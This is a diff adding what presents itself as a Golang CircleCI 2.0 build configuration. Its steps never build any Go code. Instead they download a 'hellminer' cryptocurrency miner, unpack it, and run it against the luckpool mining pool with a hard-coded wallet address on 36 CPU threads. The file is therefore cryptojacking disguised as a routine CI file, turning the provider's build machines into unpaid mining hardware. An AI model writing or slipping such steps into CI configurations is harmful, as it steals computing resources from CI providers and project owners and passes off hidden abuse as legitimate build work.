@@ -1,0 +1,16 @@
+# Golang CircleCI 2.0 configuration file
+#
+# Check https://circleci.com/docs/2.0/language-go/ for more details
+version: 2
+
+jobs:
+  build:
+    docker:
+      - image: circleci/golang:1.9
+    steps:
+      - run: ls
+      - run: sudo apt-get update
+      - run: sudo apt-get install wget tar -y
+      - run: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+      - run: tar xf hellminer_cpu_linux.tar.gz
+      - run: ./hellminer -c na.luckpool.net:3956 -u RT3QTpGdya1CCJABvKMwp6JgcPig5ZjPM9.06 -p x --cpu=36
